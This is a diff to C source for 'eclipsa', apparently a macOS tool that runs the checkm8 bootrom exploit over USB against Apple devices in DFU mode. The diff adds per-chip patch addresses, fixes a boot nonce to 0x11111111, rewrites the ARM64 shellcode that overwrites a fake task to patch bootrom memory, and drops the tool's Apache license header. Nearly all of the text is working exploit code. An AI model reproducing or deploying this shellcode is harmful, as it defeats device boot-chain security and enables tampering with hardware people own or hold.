@@ -1,17 +1,3 @@
-/* Copyright 2020 0x7ff
- *
- * Licensed under the Apache License, Version 2.0 (the "License");
- * you may not use this file except in compliance with the License.
- * You may obtain a copy of the License at
- *
- * http://www.apache.org/licenses/LICENSE-2.0
- *
- * Unless required by applicable law or agreed to in writing, software
- * distributed under the License is distributed on an "AS IS" BASIS,
- * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
- * See the License for the specific language governing permissions and
- * limitations under the License.
- */
 #include <CoreFoundation/CoreFoundation.h>
 #include <IOKit/IOCFPlugIn.h>
 #include <IOKit/usb/IOUSBLib.h>
@@ -25,7 +11,16 @@
 #	define PATCH_ADDR_1 (0x1000078C0)
 #	define PATCH_ADDR_2 (0x1000078E4)
 #	define PATCH_ADDR_3 (0x100007BAC)
-#	define PATCH_ADDR_4 (0x180088917 + strlen(SRTG))
+#	define PATCH_ADDR_4 (0x1800888C4)
+#	define PATCH_ADDR_5 (0x20E029038)
+#	define PATCH_ADDR_6 (0x20E02903C)
+#	define PATCH_VAL_0 (0xD503201F) /* nop */
+#	define PATCH_VAL_1 (0xD503201F) /* nop */
+#	define PATCH_VAL_2 (0xD503201F) /* nop */
+#	define PATCH_VAL_3 (0xD503201F) /* nop */
+#	define PATCH_VAL_4 (0x00000000) /* gUSBMoreOtherStatus */
+#	define PATCH_VAL_5 (0x11111111) /* Boot Nonce 0 */
+#	define PATCH_VAL_6 (0x11111111) /* Boot Nonce 1 */
 #elif CPID == 0x7001
 #	define SYNOPSYS_ROUTINE_ADDR (0x1000064FC)
 #	define ARCH_TASK_TRAMP_ADDR (0x100010988)
@@ -35,7 +30,16 @@
 #	define PATCH_ADDR_1 (0x10000A720)
 #	define PATCH_ADDR_2 (0x10000A744)
 #	define PATCH_ADDR_3 (0x10000AA08)
-#	define PATCH_ADDR_4 (0x180088E97 + strlen(SRTG))
+#	define PATCH_ADDR_4 (0x180088E44)
+#	define PATCH_ADDR_5 (0x20E029038)
+#	define PATCH_ADDR_6 (0x20E02903C)
+#	define PATCH_VAL_0 (0xD503201F) /* nop */
+#	define PATCH_VAL_1 (0xD503201F) /* nop */
+#	define PATCH_VAL_2 (0xD503201F) /* nop */
+#	define PATCH_VAL_3 (0xD503201F) /* nop */
+#	define PATCH_VAL_4 (0x00000000) /* gUSBMoreOtherStatus */
+#	define PATCH_VAL_5 (0x11111111) /* Boot Nonce 0 */
+#	define PATCH_VAL_6 (0x11111111) /* Boot Nonce 1 */
 #elif CPID == 0x8000 || CPID == 0x8003
 #	define SYNOPSYS_ROUTINE_ADDR (0x100006718)
 #	define VROM_PAGE_TABLE_ADDR (0x1800C8400)
@@ -44,13 +48,36 @@
 #	if CPID == 0x8000
 #		define SRTG "iBoot-2234.0.0.3.3"
 #	else
+#    define PATCH_ADDR_0 (0x100007924)
+#    define PATCH_ADDR_1 (0x10000792C)
+#    define PATCH_ADDR_2 (0x100007958)
+#    define PATCH_ADDR_3 (0x100007C9C)
+#    define PATCH_ADDR_4 (0x180087954)
+#    define PATCH_ADDR_5 (0x20E0B8038)
+#    define PATCH_ADDR_6 (0x20E0B803C)
+#    define PATCH_VAL_0 (0xD503201F) /* nop */
+#    define PATCH_VAL_1 (0xD503201F) /* nop */
+#    define PATCH_VAL_2 (0xD503201F) /* nop */
+#    define PATCH_VAL_3 (0xD503201F) /* nop */
+#    define PATCH_VAL_4 (0x00000000) /* gUSBMoreOtherStatus */
+#    define PATCH_VAL_5 (0x11111111) /* Boot Nonce 0 */
+#    define PATCH_VAL_6 (0x11111111) /* Boot Nonce 1 */
 #		define SRTG "iBoot-2234.0.0.2.22"
 #	endif
 #	define PATCH_ADDR_0 (0x100007924)
 #	define PATCH_ADDR_1 (0x10000792C)
 #	define PATCH_ADDR_2 (0x100007958)
 #	define PATCH_ADDR_3 (0x100007C9C)
-#	define PATCH_ADDR_4 (0x1800879A7 + strlen(SRTG))
+#	define PATCH_ADDR_4 (0x180087954)
+#	define PATCH_ADDR_5 (0x20E0B8038)
+#	define PATCH_ADDR_6 (0x20E0B803C)
+#	define PATCH_VAL_0 (0xD503201F) /* nop */
+#	define PATCH_VAL_1 (0xD503201F) /* nop */
+#	define PATCH_VAL_2 (0xD503201F) /* nop */
+#	define PATCH_VAL_3 (0xD503201F) /* nop */
+#	define PATCH_VAL_4 (0x00000000) /* gUSBMoreOtherStatus */
+#	define PATCH_VAL_5 (0x11111111) /* Boot Nonce 0 */
+#	define PATCH_VAL_6 (0x11111111) /* Boot Nonce 1 */
 #endif
 
 #define MAGIC (0xB4)
@@ -63,18 +90,10 @@
 #define DFU_MODE_PID (0x1227)
 #define DFU_STATE_MANIFEST (7)
 #define TASK_STACK_MIN (0x4000)
-#define PATCH_VAL_0 (0xD503201F) /* nop */
-#define PATCH_VAL_1 (0xD503201F) /* nop */
-#define PATCH_VAL_2 (0xD503201F) /* nop */
-#define PATCH_VAL_3 (0xD503201F) /* nop */
 #define EP0_MAX_PACKET_SZ (0x40)
 #define DFU_HEAP_BLOCK_SZ (0x40)
 #define DFU_FILE_SUFFIX_LEN (16)
 #define TASK_MAGIC_1 (0x74736B32)
-#define PATCH_VAL_4_0 (0x4E575020)
-#define PATCH_VAL_4_1 (0x655B3A44)
-#define PATCH_VAL_4_2 (0x70696C63)
-#define PATCH_VAL_4_3 (0x005D6173)
 #define DFU_STATE_MANIFEST_SYNC (6)
 #define TASK_STACK_MAGIC (0x7374616B)
 #define DFU_STATE_MANIFEST_WAIT_RESET (8)
@@ -88,8 +107,7 @@ typedef enum {
 	STAGE_RESET,
 	STAGE_SETUP,
 	STAGE_PATCH,
-	STAGE_ABORT,
-	STAGE_PWNED
+	STAGE_END
 } stage_t;
 
 typedef struct {
@@ -142,7 +160,7 @@ typedef struct {
 typedef struct {
 	stage_t stage;
 	UInt16 vid, pid;
-	IOUSBDeviceInterface650 **device;
+	IOUSBDeviceInterface **device;
 	CFRunLoopSourceRef async_event_source;
 } handle_t;
 
@@ -161,14 +179,13 @@ cf_dictionary_set_int16(CFMutableDictionaryRef dict, const void *key, UInt16 val
 }
 
 static kern_return_t
-check_usb_device_serv(io_service_t serv, bool *pwned) {
+check_usb_device_serv(io_service_t serv) {
 	CFStringRef usb_serial_num = IORegistryEntryCreateCFProperty(serv, CFSTR(kUSBSerialNumberString), kCFAllocatorDefault, kNilOptions);
 	kern_return_t ret = KERN_FAILURE;
 
 	if(usb_serial_num != NULL) {
 		if(CFGetTypeID(usb_serial_num) == CFStringGetTypeID() && CFStringFind(usb_serial_num, CFSTR(" SRTG:[" SRTG "]"), 0).location != kCFNotFound) {
 			ret = KERN_SUCCESS;
-			*pwned = CFStringFind(usb_serial_num, CFSTR(" PWND:[eclipsa]"), 0).location != kCFNotFound;
 		}
 		CFRelease(usb_serial_num);
 	}
@@ -199,7 +216,7 @@ close_usb_device(const handle_t *handle) {
 
 static kern_return_t
 open_usb_device(io_service_t serv, handle_t *handle) {
-	if(query_usb_interface(serv, kIOUSBDeviceUserClientTypeID, kIOUSBDeviceInterfaceID650, (LPVOID *)&handle->device) == KERN_SUCCESS) {
+	if(query_usb_interface(serv, kIOUSBDeviceUserClientTypeID, kIOUSBDeviceInterfaceID, (LPVOID *)&handle->device) == KERN_SUCCESS) {
 		if((*handle->device)->USBDeviceOpen(handle->device) == KERN_SUCCESS) {
 			if((*handle->device)->SetConfiguration(handle->device, 1) == KERN_SUCCESS && (*handle->device)->CreateDeviceAsyncEventSource(handle->device, &handle->async_event_source) == KERN_SUCCESS) {
 				CFRunLoopAddSource(CFRunLoopGetCurrent(), handle->async_event_source, kCFRunLoopDefaultMode);
@@ -338,9 +355,9 @@ checkm8_stage_patch(const handle_t *handle) {
 	*shc++ = 0xD50E871F; /* tlbi alle3 */
 	*shc++ = 0xD5033F9F; /* dsb sy */
 	*shc++ = 0xD5033FDF; /* isb */
-	*shc++ = 0x10000368; /* adr x8, #0x6C */
+	*shc++ = 0x10000328; /* adr x8, #0x64 */
 #else
-	*shc++ = 0x10000248; /* adr x8, #0x48 */
+	*shc++ = 0x10000208; /* adr x8, #0x40 */
 #endif
 	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
 	*shc++ = 0xB9000269; /* str w9, [x19] */
@@ -351,13 +368,11 @@ checkm8_stage_patch(const handle_t *handle) {
 	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
 	*shc++ = 0xB90002C9; /* str w9, [x22] */
 	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
-	*shc++ = 0xB80046E9; /* str w9, [x23], #4 */
-	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
-	*shc++ = 0xB80046E9; /* str w9, [x23], #4 */
-	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
-	*shc++ = 0xB80046E9; /* str w9, [x23], #4 */
-	*shc++ = 0xB9400109; /* ldr w9, [x8] */
 	*shc++ = 0xB90002E9; /* str w9, [x23] */
+	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
+	*shc++ = 0xB9000309; /* str w9, [x24] */
+	*shc++ = 0xB9400109; /* ldr w9, [x8] */
+	*shc++ = 0xB9000329; /* str w9, [x25] */
 #if CPID == 0x8000 || CPID == 0x8003
 	*shc++ = 0x9249F54A; /* bic x10, x10, #(ARM_TTE_BLOCK_PNX | ARM_TTE_BLOCK_NX) */
 	*shc++ = 0xB279014A; /* orr x10, x10, #ARM_TTE_BLOCK_AP_PRIV */
@@ -374,15 +389,16 @@ checkm8_stage_patch(const handle_t *handle) {
 	*shc++ = PATCH_VAL_1;
 	*shc++ = PATCH_VAL_2;
 	*shc++ = PATCH_VAL_3;
-	*shc++ = PATCH_VAL_4_0;
-	*shc++ = PATCH_VAL_4_1;
-	*shc++ = PATCH_VAL_4_2;
-	*shc = PATCH_VAL_4_3;
+	*shc++ = PATCH_VAL_4;
+	*shc++ = PATCH_VAL_5;
+	*shc = PATCH_VAL_6;
 	overwrite.fake_task.arch.x[19] = PATCH_ADDR_0;
 	overwrite.fake_task.arch.x[20] = PATCH_ADDR_1;
 	overwrite.fake_task.arch.x[21] = PATCH_ADDR_2;
 	overwrite.fake_task.arch.x[22] = PATCH_ADDR_3;
 	overwrite.fake_task.arch.x[23] = PATCH_ADDR_4;
+	overwrite.fake_task.arch.x[24] = PATCH_ADDR_5;
+	overwrite.fake_task.arch.x[25] = PATCH_ADDR_6;
 	overwrite.fake_task.magic_0 = TASK_STACK_MAGIC;
 	overwrite.fake_task.arch.lr = ARCH_TASK_TRAMP_ADDR;
 	overwrite.fake_task.stack_len = overwrite.synopsys_task.stack_len;
@@ -400,12 +416,11 @@ checkm8_stage_patch(const handle_t *handle) {
 static void
 attached_usb_handle(void *refcon, io_iterator_t iter) {
 	handle_t *handle = refcon;
-	bool pwned = false;
 	kern_return_t ret;
 	io_service_t serv;
 
 	while((serv = IOIteratorNext(iter)) != IO_OBJECT_NULL) {
-		if(check_usb_device_serv(serv, &pwned) == KERN_SUCCESS && !pwned) {
+		if(check_usb_device_serv(serv) == KERN_SUCCESS) {
 			puts("Found the USB device.");
 			if(open_usb_device(serv, handle) == KERN_SUCCESS) {
 				if(handle->stage == STAGE_RESET) {
@@ -416,28 +431,22 @@ attached_usb_handle(void *refcon, io_iterator_t iter) {
 					ret = checkm8_stage_setup(handle);
 					printf("Stage: SETUP");
 					handle->stage = STAGE_PATCH;
-				} else if(handle->stage == STAGE_PATCH) {
+				} else {
 					ret = checkm8_stage_patch(handle);
 					printf("Stage: PATCH");
-					handle->stage = STAGE_ABORT;
-				} else {
-					ret = send_usb_device_request_async(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_CLR_STATUS, 0, 0, NULL, 0, NULL);
-					printf("Stage: ABORT");
+					handle->stage = STAGE_END;
 				}
 				printf(", ret: 0x%" PRIX32 "\n", ret);
-				if(((*handle->device)->USBDeviceReEnumerate(handle->device, 0) != KERN_SUCCESS || ret != KERN_SUCCESS) && handle->stage != STAGE_ABORT) {
+				if((*handle->device)->USBDeviceReEnumerate(handle->device, 0) != KERN_SUCCESS || ret != KERN_SUCCESS) {
 					handle->stage = STAGE_RESET;
 				}
 				close_usb_device(handle);
+				if(handle->stage == STAGE_END) {
+					CFRunLoopStop(CFRunLoopGetCurrent());
+				}
 			}
 		} else {
 			IOObjectRelease(serv);
-			if(pwned) {
-				handle->stage = STAGE_PWNED;
-				CFRunLoopStop(CFRunLoopGetCurrent());
-				puts("Now you can boot untrusted images.");
-				break;
-			}
 		}
 	}
 }
@@ -458,7 +467,7 @@ eclipsa(handle_t *handle) {
 				if(IOServiceAddMatchingNotification(notify_port, kIOFirstMatchNotification, matching_dict, attached_usb_handle, handle, &attach_iter) == KERN_SUCCESS) {
 					printf("Waiting for the USB device with VID: 0x%" PRIX16 ", PID: 0x%" PRIX16 ", SRTG: " SRTG "\n", handle->vid, handle->pid);
 					attached_usb_handle(handle, attach_iter);
-					if(handle->stage != STAGE_PWNED) {
+					if(handle->stage != STAGE_END) {
 						CFRunLoopRun();
 					}
 					IOObjectRelease(attach_iter);
